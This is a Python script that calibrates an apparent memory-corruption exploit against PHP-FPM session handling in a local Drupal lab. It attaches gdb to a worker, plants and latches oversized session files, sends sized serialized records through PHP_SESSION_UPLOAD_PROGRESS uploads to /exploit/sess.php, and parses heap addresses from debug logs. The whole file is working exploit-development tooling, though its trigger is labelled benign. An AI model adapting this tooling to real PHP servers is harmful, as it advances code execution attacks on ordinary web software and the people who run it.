#!/usr/bin/env python3
"""Calibration on the Drupal/FPM lab: plant, latch, benign trigger; measure X/P/B0 and shift."""
import json, os, re, sys, time
LAB = "/tmp/opencode/research/drupal_fpm_20261022T013000Z"
sys.path.insert(0, LAB)
import tool
from tool import field, filepart, logmsg

WORKER = 144757
SIZE = int(sys.argv[1]) if len(sys.argv) > 1 else 65000
OUT = LAB + "/arms/cal_%d.json" % SIZE

def current_worker():
    for d in os.listdir('/proc'):
        if not d.isdigit(): continue
        try:
            ppid = int(open('/proc/%s/stat'%d).read().split()[3])
            cmd = open('/proc/%s/cmdline'%d,'rb').read().replace(b'\0',b' ').decode('latin1')
        except Exception:
            continue
        if ppid == 144755 and 'pool lab' in cmd:
            return int(d)
    return None

def parse_map(lines):
    out = {}
    for l in lines:
        m = re.search(r"SESSION_DECODE str=(0x[0-9a-f]+) len=(\d+)", l)
        if m and "X" not in out:
            out["X"] = int(m.group(1), 16); out["Xlen"] = int(m.group(2))
        m = re.search(r"PHPRQ_START heap=(0x[0-9a-f]+)", l)
        if m and "heap" not in out: out["heap"] = int(m.group(1), 16)
        m = re.search(r"SHUTDOWN DAT P=(0x[0-9a-f]+) last_dtor=(0x[0-9a-f]+)", l)
        if m:
            out["P"] = int(m.group(1), 16); out["B0"] = int(m.group(2), 16)
    return out

def benign_record(total):
    L = total - 8 - len(str(total))
    while True:
        t = 8 + len(str(L)) + L
        if t == total: break
        L += total - t
    rec = b'x|s:%d:"' % L + b"A" * L + b'";'
    assert len(rec) == total, (len(rec), total)
    return rec

res = {"size": SIZE}
w = current_worker()
res["worker0"] = w
if not w: raise SystemExit("no lab worker")
open(tool.GLOG, "w").close()
gout = open(LAB + "/logs/gdb_cal.out", "wb")
import subprocess
g = subprocess.Popen(["gdb","-q","--batch","-x",LAB+"/gdb/gb_cal.gdb","-p",str(w)],
                     stdout=gout, stderr=subprocess.STDOUT, cwd=LAB, start_new_session=True)
armed=False
for _ in range(200):
    if os.path.exists(tool.GLOG) and "armed" in open(tool.GLOG,errors="replace").read():
        armed=True; break
    time.sleep(0.1)
res["gdb_armed"]=armed
if not armed:
    print(open(LAB+"/logs/gdb_cal.out",errors="replace").read()[-4000:]); raise SystemExit(2)

# plant
res["plant_seed"] = tool.seed(os.path.join(tool.SESS, "sess_pl1"), tool.PLANT_REC)
n0 = tool.req_count()
r = tool.post("/exploit/sess.php", [field("PHPSESSID", b"pl1"), field("PHP_SESSION_UPLOAD_PROGRESS", b"x"), filepart()],
              tag="cal_plant", timeout=120, cookie="pl1")
res["plant"] = {"status": r["status"], "err": r.get("err")}
time.sleep(1.2)
lines = tool.lines_for(n0 + 1)
res["plant_map"] = parse_map(lines)
res["plant_lines"] = lines
res["worker_after_plant"] = current_worker()

# latch
open(os.path.join(tool.SESS, "sess_la1"), "wb").write(b"B" * 4984996)
n1 = tool.req_count()
r = tool.post("/exploit/sess.php", [field("PHPSESSID", b"la1"), field("PHP_SESSION_UPLOAD_PROGRESS", b"x"), filepart()],
              tag="cal_latch", timeout=120, cookie="la1")
res["latch"] = {"status": r["status"], "err": r.get("err")}
time.sleep(1.2)
res["latch_lines"] = tool.lines_for(n1 + 1)
res["worker_after_latch"] = current_worker()

# benign trigger
rec = benign_record(SIZE)
res["trigger_seed"] = tool.seed(os.path.join(tool.UP, "sess_tb1"), rec)
q = tool.SESS
qs = "&".join("q%d=%s" % (i, q) for i in range(8))
target = "/exploit/sess.php?" + qs
n2 = tool.req_count()
r = tool.post(target, [field("PHPSESSID", b"tb1"), field("PHP_SESSION_UPLOAD_PROGRESS", b"x"), filepart()],
              tag="cal_trigger_%d" % SIZE, timeout=240, cookie="tb1")
res["trigger"] = {"status": r["status"], "err": r.get("err"), "target": target}
time.sleep(1.5)
lines = tool.lines_for(n2 + 1)
res["trigger_lines"] = lines
res["trigger_decodes"] = [l for l in lines if "SESSION_DECODE" in l]
res["trigger_open"] = [l for l in lines if "PSFILES_OPEN" in l]
res["trigger_write"] = [l for l in lines if "PS_WRITE" in l]
res["file"] = {"len": os.path.getsize(os.path.join(tool.UP, "sess_tb1"))}
res["worker_end"] = current_worker()
json.dump(res, open(OUT,"w"), indent=1)
print(json.dumps({k:res.get(k) for k in ("worker0","plant_map","latch","trigger","trigger_decodes","trigger_open","trigger_write","file","worker_after_plant","worker_after_latch","worker_end")}, indent=1))
